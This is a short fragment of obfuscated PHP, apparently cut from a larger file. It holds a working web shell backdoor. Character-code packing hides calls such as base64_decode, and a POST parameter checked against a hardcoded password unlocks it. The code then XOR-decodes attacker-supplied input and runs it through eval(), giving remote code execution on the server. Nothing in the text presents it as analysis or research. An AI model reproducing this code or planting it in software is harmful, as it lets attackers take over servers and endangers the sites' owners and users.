...
function zxcv_md($r) {$zxcv_bd=pack("c*",98,97,115,101,54,52,95,100,101,99,111,100,101); $zxcv_s=pack("c*",115,116,114,108,101,110);$zxcv_k=pack("c*",119,117,122,97,107,101,121);$r=$zxcv_bd($r);for($i=0;$i<$zxcv_s($r);$i++)$r[$i]=chr(ord($r[$i])^ord($zxcv_k[$i%($zxcv_s($zxcv_k))]));return $r;}$zxcv_w=pack("c*",119,117,122,97);if(isset($_POST[$zxcv_w])&&zxcv_md($_POST[$zxcv_w])==pack("c*",54,97,51,52,50,97,52,99,102,54,56,100,99,48,57,101)){switch(zxcv_md($_POST["cmd"])){case "eval":zxcv_2(zxcv_md($_POST["cmddata"]));break;}exit;}function zxcv_2($phpcode){echo"<pre>";echo eval($phpcode);echo"</pre>\n";}
